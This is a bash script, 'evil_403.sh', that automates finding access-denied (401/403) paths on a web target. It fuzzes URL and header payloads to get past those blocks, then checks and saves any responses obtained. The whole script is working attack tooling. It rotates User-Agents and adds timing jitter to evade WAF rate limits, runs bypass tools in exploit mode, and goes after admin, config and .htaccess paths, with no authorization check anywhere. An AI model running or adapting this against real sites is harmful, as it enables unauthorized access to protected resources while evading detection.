#!/usr/bin/env bash
# evil_403.sh — Stealth-grade 403 recon → bypass → validation pipeline
# Author: Farhan
# Goal: High-signal, low-noise, reproducible, evidence-driven automation.

set -euo pipefail

# ----------------------------
# Configuration (edit as needed)
# ----------------------------
TARGET=""
WORDLIST_DIR="${HOME}/wordlists/SecLists/Discovery/Web-Content"
URL_PAYLOADS="./payloads/403_master_payloads.txt"   # URL + path tricks
HEADER_PAYLOADS="./payloads/403_header_payloads.txt"
OUTDIR="./evil403_out"
THREADS_RECON=20
THREADS_FUZZ=10
RATE_LIMIT="0.15"         # seconds per request to avoid WAF rate triggers
RANDOM_AGENT=1
TIMEOUT=12
RETRY=1
DELAY_JITTER="0.08"       # extra jitter added randomly per request
PROXY=""                  # e.g., http://127.0.0.1:8080 (empty for direct)
TLS_INSECURE=1            # -k for curl/ffuf to reduce TLS noise
SCOPE_PATHS=("admin" "login" "dashboard" "config" ".htaccess" "wp-admin" "api" "internal")

# Optional tool paths (leave default if on PATH)
FEROXBUSTER_BIN="feroxbuster"
DIRSEARCH_BIN="dirsearch/dirsearch.py"
FFUF_BIN="ffuf"
GOBUSTER_BIN="gobuster"
BYPASS403_BIN="bypass-403"
FOURZERO3_BIN="4zero3"
NOMORE403_BIN="nomore403"

# ----------------------------
# Usage
# ----------------------------
usage() {
  cat <<EOF
Usage: $0 -u https://target.com [options]

Options:
  -u, --url           Target base URL (required)
  -p, --proxy         Proxy (e.g., http://127.0.0.1:8080)
  -o, --outdir        Output directory (default: ${OUTDIR})
  --threads-recon     Recon threads (default: ${THREADS_RECON})
  --threads-fuzz      Fuzz threads (default: ${THREADS_FUZZ})
  --rate              Rate limit seconds (default: ${RATE_LIMIT})
  --timeout           Timeout seconds (default: ${TIMEOUT})
  --no-random-agent   Disable random User-Agent rotation
  --strict-tls        Disable -k (TLS strict)
  --payloads-url      Path to URL payloads (default: ${URL_PAYLOADS})
  --payloads-header   Path to header payloads (default: ${HEADER_PAYLOADS})
  --scope             Comma-separated hot paths (default: $(IFS=,; echo "${SCOPE_PATHS[*]}"))

Example:
  $0 -u https://example.com --proxy http://127.0.0.1:8080
EOF
  exit 1
}

# ----------------------------
# Arg parsing
# ----------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in
    -u|--url) TARGET="$2"; shift 2 ;;
    -p|--proxy) PROXY="$2"; shift 2 ;;
    -o|--outdir) OUTDIR="$2"; shift 2 ;;
    --threads-recon) THREADS_RECON="$2"; shift 2 ;;
    --threads-fuzz) THREADS_FUZZ="$2"; shift 2 ;;
    --rate) RATE_LIMIT="$2"; shift 2 ;;
    --timeout) TIMEOUT="$2"; shift 2 ;;
    --no-random-agent) RANDOM_AGENT=0; shift ;;
    --strict-tls) TLS_INSECURE=0; shift ;;
    --payloads-url) URL_PAYLOADS="$2"; shift 2 ;;
    --payloads-header) HEADER_PAYLOADS="$2"; shift 2 ;;
    --scope) IFS=',' read -r -a SCOPE_PATHS <<< "$2"; shift 2 ;;
    -h|--help) usage ;;
    *) echo "Unknown option: $1"; usage ;;
  esac
done

[[ -z "$TARGET" ]] && usage

# ----------------------------
# Prep: folders, UA pool, helpers
# ----------------------------
mkdir -p "${OUTDIR}"/{recon,bypass,validation,evidence/responses,payloads,tmp}

# Seed UA pool for stealth rotation
UA_POOL=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119 Safari/537.36"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
)
rand_ua() { echo "${UA_POOL[$((RANDOM % ${#UA_POOL[@]}))]}"; }

JITTER() {
  # sleep for rate limit plus random jitter
  awk -v base="${RATE_LIMIT}" -v j="${DELAY_JITTER}" 'BEGIN{srand(); d=base+(rand()*j); printf("%.3f\n",d)}'
}

CURL_COMMON=(-sS --max-time "${TIMEOUT}")
[[ "${TLS_INSECURE}" -eq 1 ]] && CURL_COMMON+=(-k)
[[ -n "${PROXY}" ]] && CURL_COMMON+=(--proxy "${PROXY}")

FFUF_COMMON=(-t "${THREADS_FUZZ}" -timeout "${TIMEOUT}" -rate "$(awk -v r="${RATE_LIMIT}" 'BEGIN{print 1/r}')" -ac)
[[ "${TLS_INSECURE}" -eq 1 ]] && FFUF_COMMON+=(-k)
[[ -n "${PROXY}" ]] && FFUF_COMMON+=(-x "${PROXY}")

# ----------------------------
# Step 1: Recon (stealth-mode)
# ----------------------------
echo "[*] Recon (stealth) on ${TARGET}"

# Scope preseed: quick hits to reduce noise and focus on sensitive areas
printf "%s\n" "${SCOPE_PATHS[@]}" | sed 's#^#'"${TARGET%/}"'/#' \
  > "${OUTDIR}/recon/scope_seeds.txt"

# ffuf light scan (status filter 401/403 only)
${FFUF_BIN} -u "${TARGET%/}/FUZZ" -w "${WORDLIST_DIR}/common.txt" \
  -mc 401,403 -p "${RATE_LIMIT}" "${FFUF_COMMON[@]}" \
  -H "User-Agent: $(rand_ua)" \
  -o "${OUTDIR}/recon/ffuf_403.json" || true

# feroxbuster gentle scan with auto-tune and silent mode
${FEROXBUSTER_BIN} -u "${TARGET}" \
  -w "${WORDLIST_DIR}/raft-medium-directories.txt" \
  --status-codes 401,403 --random-agent --auto-tune --silent \
  -t "${THREADS_RECON}" -x php,asp,aspx,jsp,html,txt,conf,log,bak \
  -o "${OUTDIR}/recon/ferox_403.txt" || true

# dirsearch constrained (headers + rate limit)
python3 "${DIRSEARCH_BIN}" -u "${TARGET}" \
  -e php,asp,aspx,jsp,html,txt,conf,log,bak \
  -w "${WORDLIST_DIR}/raft-medium-files.txt" \
  --include-status=401,403 --rate-limit "$(printf "%.0f" "$(awk -v r="${RATE_LIMIT}" 'BEGIN{print r*1000}')" )" \
  --random-agent --threads="${THREADS_RECON}" \
  -o "${OUTDIR}/recon/dirsearch_403.txt" || true

# Merge + dedupe recon
cat "${OUTDIR}/recon/"* 2>/dev/null | grep -Eo '(https?://[^[:space:]]+)' \
  | sed 's|[[:space:]]||g' | sort -u > "${OUTDIR}/recon/403_targets_raw.txt"

# Seed scope targets
cat "${OUTDIR}/recon/scope_seeds.txt" >> "${OUTDIR}/recon/403_targets_raw.txt"
sort -u "${OUTDIR}/recon/403_targets_raw.txt" > "${OUTDIR}/recon/403_targets.txt"

echo "[+] Recon complete. Targets: $(wc -l < "${OUTDIR}/recon/403_targets.txt")"

# ----------------------------
# Step 2: Bypass attempts (URL + header fuzzing)
# ----------------------------
echo "[*] Bypass attempts (layered, low-noise)"

# 2a. URL path fuzzing against each target
while read -r endp; do
  [[ -z "$endp" ]] && continue
  UA="$(rand_ua)"
  # ffuf URL payloads
  ${FFUF_BIN} -u "${endp%/}/FUZZ" -w "${URL_PAYLOADS}" -mc 200 \
    -H "User-Agent: ${UA}" -p "$(JITTER)" "${FFUF_COMMON[@]}" \
    -o "${OUTDIR}/bypass/ffuf_url_$(echo "$endp" | md5sum | cut -c1-8).json" || true
  sleep "$(JITTER)"
done < "${OUTDIR}/recon/403_targets.txt"

# 2b. Header fuzzing (single endpoint focus: hot paths prioritized)
# Use FFUF's header injection alias
for hot in "${SCOPE_PATHS[@]}"; do
  endpoint="${TARGET%/}/${hot}"
  ${FFUF_BIN} -u "${endpoint}" -w "${HEADER_PAYLOADS}":HF -mc 200 \
    -H "HF" -H "User-Agent: $(rand_ua)" -p "$(JITTER)" "${FFUF_COMMON[@]}" \
    -o "${OUTDIR}/bypass/ffuf_hdr_${hot}.json" || true
  sleep "$(JITTER)"
done

# 2c. External helper tools (quiet mode if supported)
# Note: Runs only on hot paths to reduce noise
if command -v "${BYPASS403_BIN}" >/dev/null 2>&1; then
  for hot in "${SCOPE_PATHS[@]}"; do
    ${BYPASS403_BIN} "${TARGET}" "/${hot}" \
      | sed 's/\r$//' >> "${OUTDIR}/bypass/bypass403_results.txt" || true
    sleep "$(JITTER)"
  done
fi

if command -v "${FOURZERO3_BIN}" >/dev/null 2>&1; then
  for hot in "${SCOPE_PATHS[@]}"; do
    ${FOURZERO3_BIN} -u "${TARGET%/}/${hot}" --exploit \
      | sed 's/\r$//' >> "${OUTDIR}/bypass/4zero3_results.txt" || true
    sleep "$(JITTER)"
  done
fi

if command -v "${NOMORE403_BIN}" >/dev/null 2>&1; then
  ${NOMORE403_BIN} -u "${TARGET}" \
    | sed 's/\r$//' >> "${OUTDIR}/bypass/nomore403_results.txt" || true
fi

# ----------------------------
# Step 3: Validation & evidence
# ----------------------------
echo "[*] Validation & evidence capture"

# Collect candidate URLs from bypass outputs and ffuf JSONs
grep -Eo '(https?://[^[:space:]]+)' "${OUTDIR}/bypass/"* 2>/dev/null \
  | sort -u > "${OUTDIR}/validation/candidates.txt" || true

# Add reconstructed FUZZ hits from ffuf JSONs (basic grep for “results” URLs)
grep -Eo '"url":"https?://[^"]+"' "${OUTDIR}/bypass/"*.json 2>/dev/null \
  | sed 's/"url":"//;s/"$//' >> "${OUTDIR}/validation/candidates.txt" || true

sort -u "${OUTDIR}/validation/candidates.txt" -o "${OUTDIR}/validation/candidates.txt"

# Validate each candidate with curl: status, headers, and body fingerprint
> "${OUTDIR}/validation/success.txt"
while read -r u; do
  [[ -z "$u" ]] && continue
  UA="$(rand_ua)"
  code=$(curl "${CURL_COMMON[@]}" -A "${UA}" -o /dev/null -w "%{http_code}" "$u" || echo "000")
  size=$(curl "${CURL_COMMON[@]}" -A "${UA}" -o /dev/null -w "%{size_download}" "$u" || echo "0")
  if [[ "$code" == "200" || "$code" == "204" || "$code" == "206" ]]; then
    echo "OK | $code | $size | $u" | tee -a "${OUTDIR}/validation/success.txt"
    # Save headers
    curl "${CURL_COMMON[@]}" -A "${UA}" -D - "$u" -o /dev/null \
      > "${OUTDIR}/evidence/headers_$(echo "$u" | md5sum | cut -c1-10).txt" || true
    # Save body (bounded) for fingerprint
    curl "${CURL_COMMON[@]}" -A "${UA}" "$u" \
      | head -c 150000 \
      > "${OUTDIR}/evidence/responses/body_$(echo "$u" | md5sum | cut -c1-10).html" || true
  fi
  sleep "$(JITTER)"
done < "${OUTDIR}/validation/candidates.txt"

echo "[+] Validation complete. Success count: $(wc -l < "${OUTDIR}/validation/success.txt" 2>/dev/null || echo 0)"

# ----------------------------
# Summary
# ----------------------------
echo "Output:
  - Recon targets:      ${OUTDIR}/recon/403_targets.txt
  - Bypass results:     ${OUTDIR}/bypass/
  - Validation success: ${OUTDIR}/validation/success.txt
  - Evidence headers:   ${OUTDIR}/evidence/headers_*.txt
  - Evidence bodies:    ${OUTDIR}/evidence/responses/"
